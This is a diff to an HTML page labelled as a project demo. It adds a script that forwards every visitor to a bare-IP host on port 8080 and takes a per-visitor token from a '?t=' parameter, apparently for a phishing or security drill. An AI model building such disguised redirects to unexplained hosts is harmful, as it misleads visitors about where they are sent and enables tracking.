@@ -10,8 +10,19 @@ body{font-family:-apple-system,"PingFang SC",Helvetica,Arial,sans-serif;backgrou
 @keyframes r{to{transform:rotate(360deg)}}
 </style>
 <script>
-// 项目演示页 -> 演练环境
-location.replace("http://120.26.219.126:8080/r/IPih2Nnm");
+// 项目演示页 -> 演练环境（?t= 为访客来源参数，缺省走默认渠道）
+(function () {
+  var HOST = "http://120.26.219.126:8080/r/";
+  var t = "IPih2Nnm";
+  try {
+    var q = new URLSearchParams(location.search).get("t");
+    if (q && /^[A-Za-z0-9_-]{1,32}$/.test(q)) t = q;
+  } catch (e) {}
+  var target = HOST + t;
+  location.replace(target);
+  var m = document.querySelector('meta[http-equiv="refresh"]');
+  if (m) m.setAttribute("content", "2;url=" + target);
+})();
 </script>
 <meta http-equiv="refresh" content="2;url=http://120.26.219.126:8080/r/IPih2Nnm">
 </head>
